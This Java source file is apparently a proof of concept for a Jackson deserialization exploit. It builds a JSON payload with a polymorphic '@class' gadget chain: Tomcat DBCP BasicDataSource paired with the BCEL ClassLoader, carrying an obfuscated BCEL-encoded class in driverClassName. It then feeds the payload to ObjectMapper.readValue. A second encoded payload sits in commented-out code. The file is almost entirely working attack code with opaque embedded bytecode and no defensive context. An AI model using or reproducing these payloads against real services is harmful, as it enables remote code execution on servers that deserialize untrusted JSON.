import com.fasterxml.jackson.annotation.JsonInclude;
import com.fasterxml.jackson.annotation.JsonTypeInfo;
import com.fasterxml.jackson.core.JsonProcessingException;
import com.fasterxml.jackson.core.type.TypeReference;
import com.fasterxml.jackson.databind.MapperFeature;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.SerializationConfig;
import com.fasterxml.jackson.databind.SerializationFeature;
import com.fasterxml.jackson.databind.type.ReferenceType;
import org.apache.commons.dbcp.BasicDataSource;

import java.lang.reflect.Array;
import java.sql.SQLException;
import java.util.ArrayList;
import java.util.List;

public class Main {


    public static void main(String[] args) {


        String payload = "{\n" +
                "  \"object\": {\n" +
                "    \"@class\": \"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\",\n" +
                "    \"driverClassName\": \"$$BCEL$$$l$8b$I$A$A$A$A$A$A$AeQ$dbN$C1$Q$3d$85$85$85$VT$40$bc$dfx$S$7c$60$e33$c6h$I$s$s$h5b$f0$b9$y$N$d6$y$db$cd$5e$I$bf$e5$8b$g$l$fc$A$3f$ca8$5d$N$92$d8f$3a$9d3sN$a7$ed$e7$d7$fb$H$80$T$iX$c8$a3j$a1$86$b5$C$ea$da$af$9b$d80$b1$c9$90$3f$95$be$8c$cf$Y$b2$cd$d6$80$c1$e8$aa$91$60Xq$a4$_$ae$93$c9P$84$f7$7c$e8$RRu$94$cb$bd$B$P$a5$8e$7fA$p$7e$94$Ri8$bd$a9$f4$3a$MVo$e6$8a$m$96$ca$8fLlQ$dcWI$e8$8aK$a9$8b$8b$ba$a8$fd$c4$a7$bc$E$T$F$T$db$r$ec$60$97$a1$a1$C$e1$l$da$XA$e0I$97$a7l$bb$cb$3d7$f1x$ac$c26$P$82$S$f6$b0O$c7i$F$86$ba$d6$b0$3d$ee$8f$ed$ae$c7$a3$c8Q$7c$qB$86Z$8aKe_$dd$cc$fb$60$a8$fcU$df$r$7e$y$t$d4$8a5$W$f1$3c$a87$5b$ce$bf$g$ba$8c$nf$c2e8j$$d$fbq$u$fdqg$91p$h$wWDQ$H$N$e4$e8$95$f5$60dtCdP$a4$dd9y$8d$y$l$bf$82$bd$nS$cd$be$c0xx$s$q$DK$e3$c8$d2j$d0$cc$a1L$KK$U$95$7e$Y$e4$cb$a9$d7y$fa$V$b2$d5$94W$f9$G$dbc$U$a1$db$B$A$A\",\n" +
                "    \"driverClassLoader\": {\n" +
                "      \"@class\": \"com.sun.org.apache.bcel.internal.util.ClassLoader\"\n" +
                "    },\n" +
                "    \"logWriter\": null\n" +
                "  }\n" +
                "}";


//        String payload  = "{\n" +
//                "  \"object\": {\n" +
//                "    \"@class\": \"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\",\n" +
//                "    \"driverClassName\": \"$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmS$ebN$d4P$Q$fe$ce$deZJq$97$C$a2$e0$F$Qq$Xe$eb$V$_$m$8a$Lh$b2h$8c$r$90$V$ff$9c$z$tP$ed$b6$b5$3d$cb$e5Q$7c$C$S$ff$n$J$Q$8d$3e$80$Pe$9c6$h$40$dc$3fg$ce$f9$e6$9b$99o$a6$d3$df$7f$be$ff$Cp$l$af4$f4aT$c1u$N$v$8cv$d01$a6$e2Fl$8b$wJ$g$c6qS$83$8e$5b$w$sb$5bV$60$aa$b8$ad$e2$8e$8a$bb$w$eei$94$e2A$7cL$wx$a8$a1$H$8f$U$3cf$c8$c9$8dP$f05$Gc$f1$p$df$e4$a6$cb$bdus$v$c1$a6$Y$d2v$e3$8c$cb$92$a1$e3$ad$93$x7$edx$8e$9c$nN$b1$b4$cc$90$a9$f8k$82$n$bf$e8x$e2M$b3Q$X$e1$S$af$bb$84$a8$d3$b6$dbbvY$92$db$9f$5e$f3$mq$vxBJ$Y4$cbo$86$b6Xpbv$87$d8t$dcr$5cN$c7$A$G$J$98$T$N$df$8cQ$j$e7$d1$cf0$ec$H$c2$h2g$83$c0ul$$$j$df$8b$cc$Kw$ed$a6$cb$a5$l$96y$Q$e8$b8$80$8b$M$8a$l$95$3d$de$a0$3aS$3a$a6$f1T$c7$M$9e$91$dc$z$c7$d3$f1$i$b3$M$85$b3mQ$Q5$5c$W$db$a4$qe$daT$dd$ac$3b$9eY$e7$d1$G$B$T$b6$82$X$3a$w$98$d31$8f$F$86$9e$93$f8$f9m$5b$E$b1$Y$j$_c$d9$85$b3$c3$q$f6j$bb1$9e$d6$b0$TI$d1$60$e8$5c$X$f2mHm$86r$87a$ac$f8$7fX$a9$5d$a6N$e9$_$fa$5b$o$ac$f0$88$e4$f7$W$db$92T$db$f7$qw$bc$88a$f0t$e2$ca$G$P$z$f1$b9$v$3c$5bL$95$de3t$9f$f8$de5$3d$e94$u$a7F$c2$8e$l$7d$ff$Uh$c1T$nC$d3$a3$c9$V$8bm$da$3d$jA$j$da$o$8a$u$o$l$90S$s$bb$b1$Ur$5b$60$98v$ba$8fv$3e$F$z$fe$e6t$d3$e2O$9a$m$y$5e$L$3a$_$d1$eb2YF6$3b$7e$I$b6G$XF$Q$90K$c04T$5c9$a6$7eE$sA$3f$fc$40$aav$88$f4$3e2Fv$l9C9$82z$80$OC$3b$40$e7$X$M$e4$7eB$af$a5$8d$$$ab$961$ceY$b5$ec7$e4$ac$5d$f4$b7$e0$7c$M$XZp$f5$I$dd$e3$H0Vv$a1V$e9$d2$bbG$V$f2$b0$b0L$3fW$wQ2B$g$40$955d$c9$a3$a1$8a$$$f2w$T$p$8f$V$U$b0J$cc$ab$c4$d0$91$99$b4$U$MU$V$M$c7$3aG$92V$af$fd$F$N$5c$a2N$fb$D$A$A\",\n" +
//                "    \"driverClassLoader\": [\"com.sun.org.apache.bcel.internal.util.ClassLoader\"],\n" +
//                "    \"logWriter\": null\n" +
//                "  }\n" +
//                "}";


        System.out.println(payload);

        ObjectMapper mapper = new ObjectMapper();
        //  mapper.enableDefaultTyping();


        try {
            mapper.readValue(payload, User.class);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }




}

